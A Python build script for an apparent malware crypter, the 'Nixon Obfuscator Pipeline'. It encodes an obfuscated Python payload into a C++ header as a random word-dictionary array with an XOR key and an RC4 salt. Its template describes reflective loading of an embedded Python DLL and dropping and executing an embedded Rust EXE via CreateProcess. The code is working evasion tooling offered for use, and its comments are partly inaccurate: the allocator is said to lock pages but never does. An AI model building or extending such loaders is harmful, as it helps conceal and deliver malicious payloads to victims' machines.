#!/usr/bin/env python3
"""
generate_payload_h.py — Auto-generates payload.h from obfuscated Python payload.

Reads an obfuscated .py file (produced by 15(14).py), generates random
key material, encodes the payload into a dictionary-based word array
format consumable by nixon_stub.cpp, and optionally embeds zlib-compressed
binary blobs (Python DLL, Rust EXE).

Usage:
    python3 generate_payload_h.py --obfuscated-py <path> [options]

Options:
    --obfuscated-py PATH    Obfuscated .py file from 15(14).py (required)
    --python-dll PATH       Python DLL to embed (compressed with zlib)
    --rust-exe PATH         Rust Windows EXE to embed (compressed with zlib)
    --output PATH           Output path for payload.h (default: ./payload.h)

The encoding scheme for NIXON_WORD_ARRAY / NIXON_DICT:
  - NIXON_DICT[256] maps each byte value 0–255 to a unique random string.
  - NIXON_WORD_ARRAY[i] = NIXON_DICT[payload_byte[i]].
  - DecodeStringArray() in nixon_stub.cpp reverses this by iterating 0..255
    to find which dictionary entry matches each word array entry.
"""

import argparse
import os
import secrets
import string
import sys
import zlib


def _random_str(min_len=4, max_len=12) -> str:
    """Generate a random identifier-safe string."""
    chars = string.ascii_letters + string.digits + '_'
    n = secrets.randbelow(max_len - min_len + 1) + min_len
    return ''.join(secrets.choice(chars) for _ in range(n))


def generate_dictionary() -> list[str]:
    """Return 256 unique random C-string tokens mapping byte values 0–255."""
    used: set[str] = set()
    d: list[str] = []
    for _ in range(256):
        while True:
            s = _random_str(4, 12)
            if s not in used:
                used.add(s)
                d.append(s)
                break
    return d


def _format_bytes(data: bytes, indent: str = "    ", cols: int = 16) -> str:
    """Format bytes as a C uint8_t[] literal (16 hex bytes per line)."""
    lines: list[str] = []
    for i in range(0, len(data), cols):
        chunk = data[i:i + cols]
        lines.append(indent + ", ".join(f"0x{b:02X}" for b in chunk))
    return ",\n".join(lines)


def _format_strings(strings: list[str], indent: str = "    ", cols: int = 4) -> str:
    """Format string list as a C const char* array (4 entries per line)."""
    lines: list[str] = []
    for i in range(0, len(strings), cols):
        items = ", ".join(f'"{s}"' for s in strings[i:i + cols])
        lines.append(indent + items)
    return ",\n".join(lines)


_HEADER_TEMPLATE = """// payload.h — Auto-generated by Nixon Obfuscator Pipeline
// WARNING: This file contains the encrypted/obfuscated payload.
// It is auto-generated by generate_payload_h.py — DO NOT EDIT.
#pragma once

// ============================================================
// SecureAllocator — Locks pages in RAM and zeroes on free.
// Uses VirtualAlloc/VirtualFree from <windows.h> (included by stub).
// ============================================================
template <typename T>
struct SecureAllocator {{
    using value_type = T;

    SecureAllocator() = default;
    template <typename U>
    SecureAllocator(const SecureAllocator<U>&) noexcept {{}}

    T* allocate(std::size_t n) {{
        if (n > static_cast<std::size_t>(-1) / sizeof(T))
            throw std::bad_alloc();
        if (auto p = static_cast<T*>(VirtualAlloc(nullptr, n * sizeof(T), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
            return p;
        throw std::bad_alloc();
    }}

    void deallocate(T* p, std::size_t n) noexcept {{
        volatile T* vp = p;
        for (std::size_t i = 0; i < n; ++i)
            vp[i] = T{{}};
        VirtualFree(p, 0, MEM_RELEASE);
    }}
}};

template <typename T, typename U>
bool operator==(const SecureAllocator<T>&, const SecureAllocator<U>&) {{ return true; }}
template <typename T, typename U>
bool operator!=(const SecureAllocator<T>&, const SecureAllocator<U>&) {{ return false; }}

template <typename T>
using SecureVector = std::vector<T, SecureAllocator<T>>;

// ============================================================
// Obfuscation key — XOR byte used by ObfString<> at compile-time
// ============================================================
constexpr uint8_t NIXON_OBF_KEY = 0x{obf_key:02X};

// ============================================================
// Key derivation salt — 16 bytes fed to DeriveRC4Key
// ============================================================
const uint8_t NIXON_KEY_SALT[16] = {{{salt_hex}}};

// ============================================================
// Word array — each string encodes one byte of the payload.
// Decoded by DecodeStringArray() via lookup against NIXON_DICT.
// ============================================================
const char* NIXON_WORD_ARRAY[{payload_len}] = {{
{word_array_body}
}};

// ============================================================
// Payload length — number of entries in NIXON_WORD_ARRAY
// ============================================================
constexpr size_t NIXON_PAYLOAD_LEN = {payload_len};

// ============================================================
// Dictionary — maps byte value (index) to a unique word string.
// DecodeStringArray iterates 0..255 to find a match.
// ============================================================
const char* NIXON_DICT[256] = {{
{dict_body}
}};

// ============================================================
// Compressed Python DLL — decompressed at runtime, then
// reflective-loaded to bootstrap the Python interpreter.
// ============================================================
{dll_section}
// ============================================================
// Compressed Rust binary — decompressed at runtime, then
// extracted to disk and executed via CreateProcess.
// ============================================================
{rust_section}
"""


def _build_placeholder_dll() -> str:
    """Return C declarations for a missing Python DLL (zero-length placeholder).
    NOTE: NIXON_DLL_COMPRESSED_LEN / NIXON_DLL_ORIGINAL_LEN (no PYTHON_ in name)."""
    return (
        "constexpr size_t NIXON_DLL_COMPRESSED_LEN = 0;\n"
        "constexpr size_t NIXON_DLL_ORIGINAL_LEN   = 0;\n"
        "const uint8_t NIXON_PYTHON_DLL[1] = { 0x00 };"
    )


def _build_compressed_dll(data: bytes) -> str:
    """Return C declarations for a zlib-compressed Python DLL."""
    compressed = zlib.compress(data)
    clen = len(compressed)
    olen = len(data)
    body = _format_bytes(compressed)
    return (
        f"constexpr size_t NIXON_DLL_COMPRESSED_LEN = {clen};\n"
        f"constexpr size_t NIXON_DLL_ORIGINAL_LEN   = {olen};\n"
        f"const uint8_t NIXON_PYTHON_DLL[NIXON_DLL_COMPRESSED_LEN] = {{\n"
        f"{body}\n"
        f"}};"
    )


def _build_placeholder_rust() -> str:
    """Return C declarations for a missing Rust binary."""
    return (
        "constexpr size_t NIXON_RUST_COMPRESSED_LEN = 0;\n"
        "constexpr size_t NIXON_RUST_ORIGINAL_LEN   = 0;\n"
        "const uint8_t NIXON_RUST_BINARY[1] = { 0x00 };"
    )


def _build_compressed_rust(data: bytes) -> str:
    """Return C declarations for a zlib-compressed Rust binary."""
    compressed = zlib.compress(data)
    clen = len(compressed)
    olen = len(data)
    body = _format_bytes(compressed)
    return (
        f"constexpr size_t NIXON_RUST_COMPRESSED_LEN = {clen};\n"
        f"constexpr size_t NIXON_RUST_ORIGINAL_LEN   = {olen};\n"
        f"const uint8_t NIXON_RUST_BINARY[NIXON_RUST_COMPRESSED_LEN] = {{\n"
        f"{body}\n"
        f"}};"
    )


def generate_payload_h(
    obfuscated_py_path: str,
    python_dll_path: str | None = None,
    rust_exe_path: str | None = None,
    output_path: str | None = None,
) -> str:
    """Generate payload.h and return its path."""
    if output_path is None:
        output_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "native", "payload.h")

    # ── 1. Read obfuscated payload ──────────────────────────────────
    with open(obfuscated_py_path, "rb") as f:
        payload_data = f.read()
    payload_len = len(payload_data)
    if payload_len == 0:
        print("[!] ERROR: obfuscated payload is empty")
        sys.exit(1)

    # ── 2. Generate key material ────────────────────────────────────
    obf_key = secrets.randbits(8)
    key_salt = [secrets.randbits(8) for _ in range(16)]
    salt_hex = ", ".join(f"0x{b:02X}" for b in key_salt)

    # ── 3. Build dictionary & encode payload ────────────────────────
    dictionary = generate_dictionary()
    word_array = [dictionary[b] for b in payload_data]

    # ── 4. Optional compressed binaries ─────────────────────────────
    dll_data: bytes | None = None
    if python_dll_path and os.path.exists(python_dll_path):
        with open(python_dll_path, "rb") as f:
            dll_data = f.read()
        print(f"  [PYTHON_DLL] {len(dll_data)} B  .. compressed → ", end="", flush=True)
        dll_section = _build_compressed_dll(dll_data)
        print(f"{len(zlib.compress(dll_data))} B")
    else:
        dll_section = _build_placeholder_dll()

    rust_data: bytes | None = None
    if rust_exe_path and os.path.exists(rust_exe_path):
        with open(rust_exe_path, "rb") as f:
            rust_data = f.read()
        print(f"  [RUST_BINARY] {len(rust_data)} B  .. compressed → ", end="", flush=True)
        rust_section = _build_compressed_rust(rust_data)
        print(f"{len(zlib.compress(rust_data))} B")
    else:
        rust_section = _build_placeholder_rust()

    # ── 5. Assemble header ──────────────────────────────────────────
    content = _HEADER_TEMPLATE.format(
        obf_key=obf_key,
        salt_hex=salt_hex,
        payload_len=payload_len,
        word_array_body=_format_strings(word_array),
        dict_body=_format_strings(dictionary),
        dll_section=dll_section,
        rust_section=rust_section,
    )

    tmp = output_path + ".tmp"
    with open(tmp, "w", newline="\n") as f:
        f.write(content)
    os.rename(tmp, output_path)

    print(f"  [payload.h] {os.path.getsize(output_path)} B  → {output_path}")
    return output_path


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate native/payload.h header from obfuscated Python payload."
    )
    parser.add_argument("--obfuscated-py", required=True,
                        help="Path to the obfuscated .py file from obfuscator/core/transforms.py")
    parser.add_argument("--python-dll",
                        help="Path to Python DLL to embed (zlib-compressed)")
    parser.add_argument("--rust-exe",
                        help="Path to Rust Windows EXE to embed (zlib-compressed)")
    parser.add_argument("--output", default=None,
                        help="Output path for payload.h (default: ./payload.h)")

    args = parser.parse_args()

    if not os.path.exists(args.obfuscated_py):
        print(f"[!] ERROR: obfuscated .py not found: {args.obfuscated_py}")
        sys.exit(1)
    for label, path in [("--python-dll", args.python_dll), ("--rust-exe", args.rust_exe)]:
        if path and not os.path.exists(path):
            print(f"[!] ERROR: {label} not found: {path}")
            sys.exit(1)

    generate_payload_h(
        obfuscated_py_path=args.obfuscated_py,
        python_dll_path=args.python_dll,
        rust_exe_path=args.rust_exe,
        output_path=args.output,
    )


if __name__ == "__main__":
    main()
